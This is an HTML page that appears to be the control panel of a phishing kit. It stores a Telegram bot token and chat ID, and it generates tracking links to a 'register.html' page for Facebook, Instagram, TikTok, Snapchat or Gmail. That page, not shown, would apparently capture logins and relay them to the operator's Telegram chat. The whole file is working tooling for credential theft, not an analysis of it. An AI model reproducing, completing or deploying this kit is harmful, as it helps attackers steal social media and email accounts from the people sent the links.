<!DOCTYPE html>
<html lang="ku">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>URL Generator</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{
  min-height:100vh; display:flex; justify-content:center; align-items:center;
  font-family:system-ui, sans-serif; background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  color:#fff;
}
.card{
  width:380px; background:rgba(0,0,0,.45); border-radius:16px; padding:24px; text-align:center;
}
h2,h4{margin-bottom:10px}
input,button{width:100%; padding:12px; border-radius:10px; border:none; margin-top:8px;}
.save{background:#0088cc;color:#fff;font-weight:600;cursor:pointer;}
.grid{display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:16px;}
.btn{color:#fff; font-weight:600; cursor:pointer;}
.facebook{background:#1877f2}
.instagram{background:#e1306c}
.tiktok{background:#000}
.snapchat{background:#fffc00;color:#000}
.gmail{background:#d93025}
#out{margin-top:12px; word-break:break-all;}
a{color:#00eaff; text-decoration:none}
hr{opacity:.3; margin:14px 0;}
</style>
</head>
<body>

<div class="card">
  <h2>URL Generator</h2>

  <h4>Telegram Bot Settings</h4>
  <input id="token" placeholder="Bot Token" />
  <input id="chat" placeholder="Chat ID" />
  <button class="save" onclick="saveBot()">Save Token & Chat ID</button>

  <hr>

  <div class="grid">
    <button class="btn facebook" onclick="make('facebook')">Facebook</button>
    <button class="btn instagram" onclick="make('instagram')">Instagram</button>
    <button class="btn tiktok" onclick="make('tiktok')">TikTok</button>
    <button class="btn snapchat" onclick="make('snapchat')">Snapchat</button>
    <button class="btn gmail" onclick="make('gmail')">Gmail</button>
  </div>

  <div id="out"></div>
</div>

<script>
function saveBot(){
    const tokenEl = document.getElementById("token");
    const chatEl  = document.getElementById("chat");

    if(!tokenEl || !chatEl){
        alert("Error: input ها نەدۆزرایەوە");
        return;
    }

    const tokenVal = tokenEl.value ? tokenEl.value.trim() : "";
    const chatVal  = chatEl.value ? chatEl.value.trim() : "";

    if(!tokenVal || !chatVal){
        alert("Token و Chat ID پێویستن");
        return;
    }

    localStorage.setItem("botToken", tokenVal);
    localStorage.setItem("chatId", chatVal);
    alert("Saved ✅");
}

function make(p){
    const code = Math.random().toString(36).slice(2,10);
    const url = `register.html?platform=${encodeURIComponent(p)}&code=${code}`;
    document.getElementById("out").innerHTML = `<a href="${url}" target="_blank">${url}</a>`;
}
</script>

</body>
</html>
